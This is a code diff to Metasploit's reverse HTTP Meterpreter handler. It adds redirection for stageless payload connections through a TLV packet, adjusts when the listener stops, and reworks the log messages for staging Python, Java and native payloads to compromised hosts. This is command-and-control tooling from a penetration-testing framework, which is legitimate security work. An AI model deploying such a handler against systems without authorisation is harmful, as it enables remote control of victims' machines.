@@ -3,6 +3,7 @@ require 'rex/io/stream_abstraction'
 require 'rex/sync/ref'
 require 'rex/payloads/meterpreter/patch'
 require 'rex/payloads/meterpreter/uri_checksum'
+require 'rex/post/meterpreter/packet'
 require 'rex/parser/x509_certificate'
 require 'msf/core/payload/windows/verify_ssl'
 
@@ -19,6 +20,7 @@ module ReverseHttp
   include Msf::Handler
   include Rex::Payloads::Meterpreter::UriChecksum
   include Msf::Payload::Windows::VerifySsl
+  include Rex::Post::Meterpreter
 
   #
   # Returns the string representation of the handler type
@@ -163,7 +165,9 @@ module ReverseHttp
   def stop_handler
     if self.service
       self.service.remove_resource("/")
-      Rex::ServiceManager.stop_service(self.service) if self.sessions == 0
+      if self.service.resources.empty? && self.sessions == 0
+        Rex::ServiceManager.stop_service(self.service)
+      end
     end
   end
 
@@ -222,8 +226,6 @@ protected
     uuid.arch      ||= obj.arch
     uuid.platform  ||= obj.platform
 
-    print_status "#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}... (UUID:#{uuid.to_s})"
-
     conn_id = nil
     if info[:mode] && info[:mode] != :connect
       conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
@@ -233,7 +235,25 @@ protected
 
     # Process the requested resource.
     case info[:mode]
+      when :init_connect
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Redirecting stageless connection ...")
+
+        # Handle the case where stageless payloads call in on the same URI when they
+        # first connect. From there, we tell them to callback on a connect URI that
+        # was generated on the fly. This means we form a new session for each.
+        sum = uri_checksum_lookup(:connect)
+        new_uri = generate_uri_uuid(sum, uuid) + '/'
+
+        # This bit is going to need to be validated by the Ruby/MSF masters as I
+        # am not sure that this is the best way to get a TLV packet out from this
+        # handler.
+        # Hurl a TLV back at the caller, and ignore the response
+        pkt = Packet.new(PACKET_TYPE_RESPONSE, 'core_patch_url')
+        pkt.add_tlv(TLV_TYPE_TRANS_URL, new_uri)
+        resp.body = pkt.to_r
+
       when :init_python
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
         url = payload_uri(req) + conn_id + '/'
 
         blob = ""
@@ -268,6 +288,7 @@ protected
         })
 
       when :init_java
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
 
         blob = ""
@@ -296,9 +317,9 @@ protected
         })
 
       when :init_native
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
 
-        print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
         resp['Content-Type'] = 'application/octet-stream'
 
         blob = obj.stage_payload
@@ -335,9 +356,10 @@ protected
         })
 
       when :connect
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Attaching orphaned/stageless session ...")
+
         resp.body = ""
         conn_id = req.relative_resource
-        print_status("Incoming orphaned or stageless session #{conn_id}, attaching...")
 
         # Short-circuit the payload's handle_connection processing for create_session
         create_session(cli, {
